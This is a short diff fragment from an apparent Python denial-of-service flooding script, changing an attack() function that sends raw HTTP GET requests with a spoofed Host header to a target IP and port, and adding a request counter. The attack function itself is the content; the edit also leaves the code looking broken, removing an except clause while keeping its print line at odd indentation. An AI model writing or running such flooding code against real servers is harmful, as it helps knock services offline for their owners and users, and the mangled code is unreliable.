@@ -98,9 +98,10 @@ def attack():
    s.sendto(("GET /"+ip+"HTTP/1.1\r\n").encode("ascii"),(ip , port))
    s.sendto(("Host:"+fackip+"\r\n\r\n").encode("ascii"),(ip , port))
   
-except gaierror:
+   global Counter
+   Counter += 1
     print(f"{red} please Check Your Internet Connection {default}")
-    exit()
+    s.close()
 
 ####### we will send requests #######
 def req_send(ip,port,byte):
